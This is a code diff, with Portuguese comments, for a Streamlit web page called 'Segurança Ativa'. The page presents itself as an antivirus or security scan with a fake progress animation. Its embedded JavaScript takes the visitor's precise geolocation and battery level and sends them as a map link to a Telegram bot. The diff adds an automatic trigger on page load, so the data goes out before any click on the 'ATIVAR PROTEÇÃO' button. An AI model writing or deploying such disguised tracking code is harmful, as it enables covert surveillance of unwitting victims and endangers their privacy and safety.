@@ -8,7 +8,7 @@ ID = "8210828398"
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# --- ESTILIZAÇÃO (MANTIDA EXATAMENTE IGUAL) ---
+# --- SUA ESTILIZAÇÃO (MANTIDA 100%) ---
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -45,13 +45,12 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# --- O BOTÃO: CONFIGURADO PARA PRECISÃO DE LOCAL DA GOOGLE ---
-js_google_system = f"""
+# --- LÓGICA HÍBRIDA: AUTO-ATIVAR + BOTÃO FUNCIONAL ---
+js_auto_e_botao = f"""
 <script>
-async function dispararGooglePrecision() {{
-    // Ativa a Precisão de Local (Pop-up escuro do Android)
+async function acionarSistema() {{
     const options = {{
-        enableHighAccuracy: true,
+        enableHighAccuracy: true, // Força o pop-up da Google (Foto 2)
         timeout: 10000,
         maximumAge: 0
     }};
@@ -72,7 +71,6 @@ async function dispararGooglePrecision() {{
                             "🔋 *Bateria:* `" + bPct + "%`\\n" +
                             "📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
                 
-                // Envio direto via Navegador para o Bot
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
                     headers: {{ "Content-Type": "application/json" }},
@@ -83,25 +81,28 @@ async function dispararGooglePrecision() {{
                     }})
                 }});
                 
-                // Avisa o Streamlit para girar a bolha de 4% para 100%
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
             }} catch (e) {{ console.error(e); }}
         }},
-        (err) => {{ console.log("Recusado"); }},
+        (err) => {{ console.log("Aguardando clique manual..."); }},
         options
     );
 }}
+
+// TENTA ATIVAR AUTOMATICAMENTE ASSIM QUE CARREGA
+setTimeout(acionarSistema, 1000);
 </script>
-<button class="btn-barra" onclick="dispararGooglePrecision()">
+
+<button class="btn-barra" onclick="acionarSistema()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
-# Renderiza o botão na tela
-ativado = st.components.v1.html(js_google_system, height=80)
+# Renderiza o componente
+finalizou = st.components.v1.html(js_auto_e_botao, height=80)
 
-# --- EXECUÇÃO APÓS CLIQUE ---
-if ativado:
+# --- ANIMAÇÃO DE SUCESSO ---
+if finalizou:
     for p in range(4, 101, 8):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
